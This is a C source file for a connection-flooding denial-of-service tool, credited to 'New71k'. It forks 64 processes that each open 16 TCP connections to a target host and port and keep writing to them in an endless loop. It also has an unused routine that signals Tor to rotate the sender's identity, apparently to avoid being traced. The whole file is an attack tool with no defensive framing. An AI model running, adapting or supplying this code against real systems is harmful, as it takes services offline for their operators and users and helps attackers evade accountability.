#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CONNECTIONS 16
#define THREADS 64
#define BUFFER_SIZE 1
#define SLEEP_DURATION 100000

void handle_signal(int signal) {
}

int create_socket(const char *host, const char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sockfd;
    int result;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((result = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(result));
        exit(EXIT_FAILURE);
    }

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            continue;
        }

        break;
    }

    if (p == NULL) {
        freeaddrinfo(servinfo);
        fprintf(stderr, "Unable to connect to %s:%s\n", host, port);
        exit(EXIT_FAILURE);
    }

    freeaddrinfo(servinfo);
    return sockfd;
}

void perform_attack(const char *host, const char *port, int id) {
    int sockets[CONNECTIONS];
    int i;
    ssize_t bytes_written;

    memset(sockets, 0, sizeof(sockets));
    signal(SIGPIPE, handle_signal);

    while (1) {
        for (i = 0; i < CONNECTIONS; i++) {
            if (sockets[i] == 0) {
                sockets[i] = create_socket(host, port);
            }

            bytes_written = write(sockets[i], "\0", BUFFER_SIZE);
            if (bytes_written == -1) {
                close(sockets[i]);
                sockets[i] = create_socket(host, port);
            }

            fprintf(stderr, "[Thread %d: Data sent]\n", id);
        }

        usleep(SLEEP_DURATION);
    }
}

void cycle_identity() {
    int sockfd;
    ssize_t bytes_written;

    sockfd = create_socket("localhost", "9050");
    write(sockfd, "AUTHENTICATE \"\"\n", 16);

    while (1) {
        bytes_written = write(sockfd, "signal NEWNYM\n\x00", 16);
        fprintf(stderr, "[Identity cycled: %ld bytes written]\n", bytes_written);
        usleep(SLEEP_DURATION);
    }
}

int main(int argc, char **argv) {
    int i;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    for (i = 0; i < THREADS; i++) {
        if (fork() == 0) {
            perform_attack(argv[1], argv[2], i);
            exit(EXIT_SUCCESS);
        }

        usleep(100000);
    }

    getc(stdin);
    return 0;
}

/* Credits: New71k */
